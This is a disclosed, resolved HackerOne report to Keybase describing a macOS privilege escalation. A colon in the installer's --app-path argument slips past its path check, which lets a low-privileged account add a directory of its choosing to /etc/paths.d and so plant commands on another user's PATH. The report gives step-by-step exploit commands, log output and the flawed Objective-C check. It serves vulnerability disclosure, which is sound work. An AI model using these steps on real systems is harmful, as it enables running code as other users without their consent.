{
  "id": 490960,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80OTA5NjA=",
  "url": "https://hackerone.com/reports/490960",
  "title": "macOS privilege escalation",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-02-04T11:54:03.909Z",
  "submitted_at": "2019-02-04T11:54:03.909Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "u3mur4",
    "url": "/u3mur4",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 2809,
    "url": "https://hackerone.com/keybase",
    "handle": "keybase",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Keybase",
      "twitter_handle": "keybaseio",
      "website": "https://keybase.io",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-01-24T23:20:42.560Z",
  "bug_reporter_agreed_on_going_public_at": "2020-01-23T07:13:03.506Z",
  "team_member_agreed_on_going_public_at": "2020-01-24T23:20:42.496Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Short description\n\nWe can add an arbitrary folder to the default `$PATH` environment variable, so we can exploit this to run arbitrary code as the targeted user.\n\n# Steps to reproduce\n\n1. In the example I will use the low privileged `nobody` account (could be any other account) and I will target the `u3mur4` admin user.\n```\n➜ ~ sudo -u nobody bash\nPassword:\nbash-3.2$ id\nuid=4294967294(nobody) gid=4294967294(nobody) groups=4294967294(nobody),12(everyone),61(localaccounts),702(2),701(1),100(_lpoperator)\n```\n\n2. Make sure the `/usr/local/bin` directory not exist.\n```\nsudo mv /usr/local/bin /usr/local/bin2\n```\n> By default this directory not exist.\n\n3. Remove the `/etc/paths.d/Keybase` file using keybase installer with the `--uninstall-cli` flag.\n```\nbash-3.2$ cat /etc/paths.d/Keybase\n/Applications/Keybase.app/Contents/SharedSupport/bin\nbash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path='/Applications/Keybase.app' --uninstall-cli\n[REMOVED]\n02.04.2019 02:30:24.274 Installer:109[INFO] Uninstalled\nbash-3.2$ cat /etc/paths.d/Keybase\ncat: /etc/paths.d/Keybase: No such file or directory\n```\n> When the `/usr/local/bin` directory not exist the installer will create the `/etc/paths.d/Keybase` file.\n\n4.  Create the `/var/tmp/poc/Contents/SharedSupport/bin` folder structure and create an executable file named as `keybase`.\n```bash\nbash-3.2$ mkdir -p /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2$ cd /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2$ cat <<EOF >> keybase\n#! /bin/bash\necho test\nEOF\nbash-3.2$ chmod +x keybase\n```\n\n5. Run the keybase installer command with `--app-path=/Applications/Keybase.app/:/var/tmp/poc` and the `--install-cli` flag.\n```\nbash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path='/Applications/Keybase.app/:/var/tmp/poc' --install-cli\n[REMOVED]\n02.04.2019 02:34:38.720 KBInstaller:32[DEBG] Install: CLI\n02.04.2019 02:34:38.720 KBCommandLine:38[DEBG] Helper: addToPath({\n    appName = Keybase;\n    directory = \"/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\";\n    name = keybase;\n})\n02.04.2019 02:34:38.723 KBCommandLine:40[DEBG] Result: {\n    path = \"/etc/paths.d/Keybase\";\n}\n02.04.2019 02:34:38.723 KBCommandLine:47[DEBG] Helper: addToPath({\n    appName = Keybase;\n    directory = \"/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\";\n    name = \"git-remote-keybase\";\n})\n[REMOVED]\nbash-3.2$ cat /etc/paths.d/Keybase\n/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\n```\n\n6. Wait until the targeted user opens a new terminal. The new terminal will load the paths from `/etc/paths.d`.\n```\n➜  ~ id\nuid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)\n➜  ~ which keybase\n/var/tmp/poc/Contents/SharedSupport/bin/keybase\n➜  ~ /usr/libexec/path_helper\nPATH=\"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\"; export PATH;\n➜  ~ keybase\ntest\n```\n\n# Why this works? \nThe `checkIfPathIsFishy` doesn't checks that the path contains the `\":\"` character. \n\n```objective-c\n(BOOL)checkIfPathIsFishy:(NSString *)path { \n NSArray *v = [path componentsSeparatedByString:@\"/\"]; \n for (int i = 0; i < v.count; i++) { \n if ([v[i] isEqualToString:@\"..\"]) { \n return YES; \n } \n if ([v[i] isEqualToString:@\".\"]) { \n return YES; \n } \n } \n \n // Do not allow ~ or $ characters in the path. \n if ([path rangeOfString:@\"$\"].location != NSNotFound) { \n return YES; \n } \n if ([path rangeOfString:@\"~\"].location != NSNotFound) { \n return YES; \n } \n return NO; \n} \n```\n\nThe `addToPath` writes the path (`/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin`) to the `/etc/paths.d/Keybase` file. The `:` will be interpreted as a search path separator and it will be added to the `$PATH` environment variable.\n```\n  // If we don't have a /usr/local/bin then fall back to /etc/paths.d.\n  // Terminal will load /etc/profile, which uses /usr/libexec/path_helper which loads paths from /etc/paths.d.\n  // Some users will override the default usage of /etc/profile in Terminal though so this isn't guaranteed to\n  // include keybase in the path on those systems, however, these two cases should handle most of our users.\n\n  NSString *pathsd = @\"/etc/paths.d\";\n\n  // On fresh Sierra install, /etc/paths.d doesn't exist\n  if (![NSFileManager.defaultManager fileExistsAtPath:pathsd]) {\n    NSError *error = nil;\n    if (![NSFileManager.defaultManager createDirectoryAtPath:pathsd withIntermediateDirectories:NO attributes:nil error:&error]) {\n      completion(error, nil);\n      return;\n    }\n  }\n\n  NSString *pathsdPath = [NSString stringWithFormat:@\"%@/%@\", pathsd, appName];\n  if ([NSFileManager.defaultManager fileExistsAtPath:pathsdPath]) {\n    completion(nil, nil);\n    return;\n  }\n  NSError *error = nil;\n  [directory writeToFile:pathsdPath atomically:YES encoding:NSUTF8StringEncoding error:&error];\n  completion(error, @{@\"path\": pathsdPath});\n}\n```\n\n## Impact\n\nAccess other users personal files and execute commands as the user. If the user is root we could  immediately gain root privileges .",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 44,
  "voters": [
    "r4d1kal",
    "superhero1",
    "sourc7",
    "u3mur4",
    "imranhudaa",
    "ali",
    "icanthack",
    "metnew",
    "aryan2808",
    "pikayrachu",
    "and 34 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
